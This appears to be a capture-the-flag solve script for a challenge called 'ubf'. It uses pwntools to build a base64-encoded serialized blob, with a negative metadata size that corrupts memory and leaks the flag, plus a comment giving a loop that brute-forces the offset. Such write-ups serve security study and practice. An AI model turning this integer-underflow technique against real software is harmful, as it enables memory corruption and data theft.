# Copyright 2023 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Run multiple times to brute force offset
# for i in {1..100}; do echo $i; python3 solve.py $i | ./ubf; done

from pwn import *

blah = b''

blah += p32(5) # One string "$FLAG"
blah += b's'
blah += p16(1)
blah += p16(2)
blah += p16(5)
blah += b'$FLAG'

blah += p32(100) # Size 100 so that we get malloced further down
blah += b'b' # One bool "A"
blah += p16(1)
blah += p16(0x10000-int(sys.argv[1])) # Negative metadata size
blah += b'A'

print(b64e(blah))
